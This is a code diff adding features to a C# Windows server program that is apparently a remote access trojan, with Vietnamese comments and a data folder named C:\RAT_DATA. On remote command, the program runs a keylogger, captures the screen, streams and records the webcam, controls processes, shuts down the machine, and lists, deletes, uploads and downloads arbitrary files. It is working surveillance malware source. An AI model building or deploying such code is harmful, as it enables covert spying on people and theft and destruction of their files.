@@ -14,20 +14,37 @@ using System.Diagnostics;
 using System.Drawing.Imaging;
 using System.Threading;
 using KeyLogger;
-
+using AForge.Video;
+using AForge.Video.DirectShow;
+using Accord.Video.FFMPEG; // Thư viện quay phim bạn vừa tải
+using System.Runtime.ExceptionServices; // Bắt buộc có dòng này
+using System.Security;
 namespace ServerApp
 {
     public partial class server : Form
     {
         Thread serverThread; // Luồng chính để chạy Server lắng nghe
         Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
-
+        // --- KHAI BÁO BIẾN WEBCAM (THÊM MỚI) ---
+        Thread videoServerThread; // Luồng chạy server video (Port 5657)
+        VideoCaptureDevice videoSource; // Thiết bị Webcam
+        VideoFileWriter writer;   // Biến ghi hình của Accord
+        bool isStreaming = false;
+        bool isRecording = false;
+        Socket videoClient;       // Socket gửi ảnh
+        string currentVideoFile = "";
+        string dataFolder = @"C:\RAT_DATA";
+        // ---------------------------------------
         public server()
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false; // Cho phép truy cập UI từ luồng khác (dùng cẩn thận)
             this.FormClosing += new FormClosingEventHandler(server_FormClosing);
-
+            // Tạo thư mục lưu dữ liệu nếu chưa có
+            if (!Directory.Exists(dataFolder))
+            {
+                Directory.CreateDirectory(dataFolder);
+            }
             // Xóa file log cũ khi khởi động lại server để tránh file bị phình to
             try
             {
@@ -40,6 +57,7 @@ namespace ServerApp
         // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
         private void server_FormClosing(object sender, FormClosingEventArgs e)
         {
+            StopWebcam();
             System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
 
@@ -53,6 +71,10 @@ namespace ServerApp
             serverThread = new Thread(StartServerLoop);
             serverThread.IsBackground = true;
             serverThread.Start();
+            // --- THÊM MỚI: Chạy Server Video ở Port 5657 ---
+            videoServerThread = new Thread(StartVideoServer);
+            videoServerThread.IsBackground = true;
+            videoServerThread.Start();
         }
 
         // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
@@ -78,6 +100,7 @@ namespace ServerApp
 
                         // Chuyển sang xử lý lệnh
                         HandleClientCommunication();
+
                     }
                     catch { }
                 }
@@ -90,6 +113,8 @@ namespace ServerApp
         }
 
         // Phân tích cú pháp lệnh gửi từ Client
+        // File: server.cs - Cập nhật hàm HandleClientCommunication
+
         private void HandleClientCommunication()
         {
             String s = "";
@@ -98,13 +123,31 @@ namespace ServerApp
                 receiveSignal(ref s);
                 switch (s)
                 {
-                    case "KEYLOG": keylog(); break;     // Chuyển sang xử lý Keylog
-                    case "SHUTDOWN": System.Diagnostics.Process.Start("ShutDown", "-s"); break;
-                    case "RESTART": System.Diagnostics.Process.Start("shutdown", "/r /t 0"); break;
-                    case "TAKEPIC": takepic(); break;   // Chụp màn hình
-                    case "PROCESS": process(); break;   // Quản lý tiến trình
-                    case "APPLICATION": application(); break; // Quản lý ứng dụng
-                    case "QUIT": return; // Ngắt kết nối hiện tại
+                    // --- NHÓM 1: CÁC MODULE CŨ ---
+                    case "KEYLOG": keylog(); break;
+                    case "PROCESS": process(); break;
+                    case "APPLICATION": application(); break;
+                    case "TAKEPIC": takepic(); break;
+                    case "SHUTDOWN": Process.Start("ShutDown", "-s"); break;
+                    case "RESTART": Process.Start("shutdown", "/r /t 0"); break;
+
+                    // --- NHÓM 2: WEBCAM (GOM VÀO 1 HÀM) ---
+                    case "WEBCAM_START":
+                    case "WEBCAM_STOP":
+                    case "WEBCAM_RECORD_ON":
+                    case "WEBCAM_RECORD_OFF":
+                        WebcamHandler(s); // Truyền lệnh con vào xử lý
+                        break;
+
+                    // --- NHÓM 3: FILE MANAGER (GOM VÀO 1 HÀM) ---
+                    case "GET_FILES":
+                    case "DELETE_FILE":
+                    case "UPLOAD_FILE":
+                    case "DOWNLOAD_FILE":
+                        FileHandler(s); // Truyền lệnh con vào xử lý
+                        break;
+
+                    case "QUIT": return;
                 }
             }
         }
@@ -192,18 +235,26 @@ namespace ServerApp
                 {
                     try
                     {
-                        // Chụp toàn màn hình
+                        // 1. Chụp màn hình
                         Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                         Graphics g = Graphics.FromImage(bmp);
                         g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
 
-                        // Lưu vào MemoryStream để chuyển thành mảng byte
+                        // 2. LƯU FILE VÀO C:\RAT_DATA (THÊM MỚI)
+                        try
+                        {
+                            string photoName = "Screen_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png";
+                            string savePath = Path.Combine(dataFolder, photoName);
+                            bmp.Save(savePath, ImageFormat.Png);
+                        }
+                        catch { /* Bỏ qua lỗi lưu file nếu ổ cứng đầy/lỗi quyền */ }
+
+                        // 3. Gửi qua mạng về Client (Giữ nguyên logic cũ để hiện lên Web)
                         MemoryStream ms = new MemoryStream();
                         bmp.Save(ms, ImageFormat.Bmp);
                         byte[] b = ms.ToArray();
-
-                        // Gửi kích thước ảnh trước, sau đó gửi dữ liệu ảnh
-                        Program.nw.WriteLine(b.Length.ToString()); Program.nw.Flush();
+                        Program.nw.WriteLine(b.Length.ToString());
+                        Program.nw.Flush();
                         Program.client.Send(b);
                     }
                     catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
@@ -284,6 +335,330 @@ namespace ServerApp
                     }
                 }
             }
+        }
+        // ==========================================================
+        // KHU VỰC HÀM XỬ LÝ WEBCAM & RECORDING (THÊM MỚI TOÀN BỘ)
+        // ==========================================================
+
+        // 1. Hàm khởi tạo Server Video tại Port 5657
+        private void StartVideoServer()
+        {
+            try
+            {
+                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5657);
+                Socket vServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                vServer.Bind(ip);
+                vServer.Listen(10);
+                while (true)
+                {
+                    videoClient = vServer.Accept();
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Lỗi Port 5657: " + ex.Message);
+            }
+        }
+
+        // 2. Bật Webcam
+        [HandleProcessCorruptedStateExceptions]
+        [SecurityCritical]
+        void StartWebcam()
+        {
+            try
+            {
+                FilterInfoCollection videos = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+
+                if (videos.Count == 0)
+                {
+                    MessageBox.Show("Lỗi: Không tìm thấy Webcam nào!");
+                    return;
+                }
+
+                // Lấy Camera đầu tiên
+                // Nếu gặp OBS Camera lỗi, thuộc tính bên trên sẽ chặn việc sập nguồn
+                videoSource = new VideoCaptureDevice(videos[0].MonikerString);
+                videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
+                videoSource.Start();
+            }
+            catch (Exception ex)
+            {
+                // Bây giờ nó sẽ hiện lỗi ra đây thay vì tắt bụp chương trình
+                MessageBox.Show("Đã bỏ qua lỗi Driver Camera: " + ex.Message);
+            }
+        }
+
+        // 3. Tắt Webcam và đóng file ghi hình
+        void StopWebcam()
+        {
+            if (videoSource != null && videoSource.IsRunning)
+            {
+                videoSource.SignalToStop();
+                videoSource = null;
+            }
+
+            // Sửa đoạn này để dọn dẹp sạch sẽ writer
+            if (writer != null)
+            {
+                try
+                {
+                    writer.Close();
+                    writer.Dispose();
+                }
+                catch { }
+                writer = null; // <--- QUAN TRỌNG
+            }
+        }
+
+        // 4. Bắt đầu Ghi hình (Dùng Accord)
+        void StartRecording()
+        {
+            try
+            {
+                // 1. Tạo tên file .mp4 và ghép với đường dẫn C:\RAT_DATA
+                string fileName = "Record_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi";
+                currentVideoFile = Path.Combine(dataFolder, fileName);
+
+                // 2. QUAN TRỌNG: Reset writer cũ nếu có để tránh lỗi ObjectDisposed
+                if (writer != null)
+                {
+                    writer.Dispose();
+                    writer = null;
+                }
+
+                isRecording = true;
+            }
+            catch (Exception ex) { MessageBox.Show("Lỗi bật ghi hình: " + ex.Message); }
+        }
+
+        // 5. Sự kiện xử lý từng khung hình (Quan trọng)
+        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            try
+            {
+                // Clone ảnh để xử lý
+                Bitmap image = (Bitmap)eventArgs.Frame.Clone();
+
+                // 1. GHI HÌNH (RECORD)
+                if (isRecording)
+                {
+                    try
+                    {
+                        // Nếu writer chưa mở -> Mở mới
+                        if (writer == null)
+                        {
+                            writer = new VideoFileWriter();
+                            
+                            // --- XỬ LÝ KÍCH THƯỚC LẺ (QUAN TRỌNG) ---
+                            // FFmpeg sẽ sập ngay lập tức nếu chiều rộng/cao là số lẻ
+                            int w = image.Width;
+                            int h = image.Height;
+                            if (w % 2 != 0) w--; // Giảm 1 pixel nếu lẻ
+                            if (h % 2 != 0) h--;
+                            
+                            // Mở file AVI với kích thước CHẴN và Codec MPEG4
+                            // Bitrate 1500000 (1.5 Mbps) là đủ đẹp và nhẹ
+                            writer.Open(currentVideoFile, w, h, 25, VideoCodec.MPEG4, 1500000);
+                        }
+
+                        // Ghi hình (Chỉ ghi khi writer đã mở thành công)
+                        if (writer.IsOpen)
+                        {
+                            // Lưu ý: Nếu ảnh gốc là lẻ, Accord thường tự crop nhẹ để vừa với kích thước chẵn đã Open
+                            // Nên ta cứ truyền nguyên ảnh gốc vào
+                            writer.WriteVideoFrame(image);
+                        }
+                    }
+                    catch (Exception)
+                    {
+                        // Nếu lỗi ghi frame -> Tắt ghi hình luôn để tránh crash ứng dụng
+                        isRecording = false;
+                        if (writer != null) { try { writer.Dispose(); } catch {} writer = null; }
+                    }
+                }
+
+                // 2. STREAMING (Giữ nguyên)
+                if (isStreaming && videoClient != null && videoClient.Connected)
+                {
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
+                        myEncoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);
+                        image.Save(ms, GetEncoderInfo("image/jpeg"), myEncoderParameters);
+                        
+                        byte[] buffer = ms.ToArray();
+                        byte[] sizeInfo = Encoding.ASCII.GetBytes(buffer.Length.ToString() + "\n");
+                        videoClient.Send(sizeInfo);
+                        videoClient.Send(buffer);
+                    }
+                }
+                
+                image.Dispose();
+            }
+            catch { }
+        }
+
+        // 6. Hàm phụ trợ nén ảnh
+        private static ImageCodecInfo GetEncoderInfo(String mimeType)
+        {
+            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
+            foreach (ImageCodecInfo codec in codecs)
+                if (codec.MimeType == mimeType) return codec;
+            return null;
+        }
+
+        // 7. MODULE: Xử lý Webcam & Quay phim
+        private void WebcamHandler(string command)
+        {
+            switch (command)
+            {
+                case "WEBCAM_START":
+                    isStreaming = true;
+                    StartWebcam();
+                    Program.nw.WriteLine("Webcam Started");
+                    break;
+
+                case "WEBCAM_STOP":
+                    isStreaming = false;
+                    isRecording = false;
+                    StopWebcam();
+                    Program.nw.WriteLine("Webcam Stopped");
+                    break;
+
+                case "WEBCAM_RECORD_ON":
+                    StartRecording();
+                    Program.nw.WriteLine("Recording Started");
+                    break;
+
+                case "WEBCAM_RECORD_OFF":
+                    isRecording = false;
+                    Thread.Sleep(100); // Đợi luồng ghi nhả file
+
+                    if (writer != null)
+                    {
+                        try { writer.Close(); writer.Dispose(); } catch { }
+                        writer = null; // Reset
+                    }
+
+                    Program.nw.WriteLine("Recording Saved");
+                    break;
+            }
+            Program.nw.Flush();
+        }
+        // MODULE: Quản lý File (File Explorer)
+        private void FileHandler(string command)
+        {
+            try
+            {
+                switch (command)
+                {
+                    // 1. LẤY DANH SÁCH FILE/THƯ MỤC
+                    case "GET_FILES":
+                        string path = Program.nr.ReadLine();
+                        List<string> items = new List<string>();
+
+                        if (string.IsNullOrEmpty(path) || path == "ROOT")
+                        {
+                            DriveInfo[] drives = DriveInfo.GetDrives();
+                            foreach (DriveInfo d in drives)
+                                if (d.IsReady) items.Add($"[DRIVE]|{d.Name}|{d.TotalSize}");
+                        }
+                        else if (Directory.Exists(path))
+                        {
+                            string[] dirs = Directory.GetDirectories(path);
+                            foreach (string d in dirs) items.Add($"[FOLDER]|{Path.GetFileName(d)}|0");
+
+                            string[] files = Directory.GetFiles(path);
+                            foreach (string f in files)
+                            {
+                                FileInfo fi = new FileInfo(f);
+                                items.Add($"[FILE]|{Path.GetFileName(f)}|{fi.Length}");
+                            }
+                        }
+
+                        Program.nw.WriteLine(items.Count.ToString());
+                        Program.nw.Flush();
+                        foreach (string item in items) { Program.nw.WriteLine(item); Program.nw.Flush(); }
+                        break;
+
+                    // 2. XÓA FILE
+                    case "DELETE_FILE":
+                        string targetPath = Program.nr.ReadLine();
+                        if (File.Exists(targetPath))
+                        {
+                            File.Delete(targetPath);
+                            Program.nw.WriteLine("Đã xóa file.");
+                        }
+                        else if (Directory.Exists(targetPath))
+                        {
+                            Directory.Delete(targetPath, true);
+                            Program.nw.WriteLine("Đã xóa thư mục.");
+                        }
+                        else Program.nw.WriteLine("Đường dẫn không tồn tại.");
+                        break;
+
+                    // 3. TẢI FILE VỀ MÁY (DOWNLOAD)
+                    case "DOWNLOAD_FILE":
+                        string downPath = Program.nr.ReadLine();
+                        if (File.Exists(downPath))
+                        {
+                            FileInfo fi = new FileInfo(downPath);
+                            Program.nw.WriteLine(fi.Length.ToString());
+                            Program.nw.Flush();
+                            Program.client.SendFile(downPath);
+                        }
+                        else Program.nw.WriteLine("0");
+                        break;
+
+                    // 4. UPLOAD FILE LÊN SERVER (CHUNKING)
+                    case "UPLOAD_FILE":
+                        string savePath = "";
+                        // Vét sạch dòng trống (Ghost Newlines)
+                        while (string.IsNullOrWhiteSpace(savePath))
+                        {
+                            if (Program.nr.Peek() == -1) break;
+                            savePath = Program.nr.ReadLine();
+                        }
+                        string sizeStr = Program.nr.ReadLine();
+
+                        long dataSize;
+                        if (!string.IsNullOrEmpty(savePath) && long.TryParse(sizeStr, out dataSize))
+                        {
+                            StringBuilder b64Builder = new StringBuilder((int)dataSize);
+                            char[] buffer = new char[4096];
+                            long totalRead = 0;
+
+                            while (totalRead < dataSize)
+                            {
+                                int toRead = (int)Math.Min(buffer.Length, dataSize - totalRead);
+                                int read = Program.nr.Read(buffer, 0, toRead);
+                                if (read == 0) break;
+                                b64Builder.Append(buffer, 0, read);
+                                totalRead += read;
+                            }
+
+                            if (totalRead >= dataSize)
+                            {
+                                try
+                                {
+                                    byte[] fileBytes = Convert.FromBase64String(b64Builder.ToString());
+                                    File.WriteAllBytes(savePath, fileBytes);
+                                    Program.nw.WriteLine("Upload thành công!");
+                                }
+                                catch { Program.nw.WriteLine("Lỗi: File hỏng."); }
+                            }
+                            else Program.nw.WriteLine($"Lỗi: Mới nhận {totalRead}/{dataSize} bytes.");
+                        }
+                        else Program.nw.WriteLine("Lỗi: Header sai.");
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                // Gửi thông báo lỗi chung nếu có ngoại lệ
+                Program.nw.WriteLine("Lỗi Server: " + ex.Message);
+            }
+            Program.nw.Flush();
         }
     }
 }
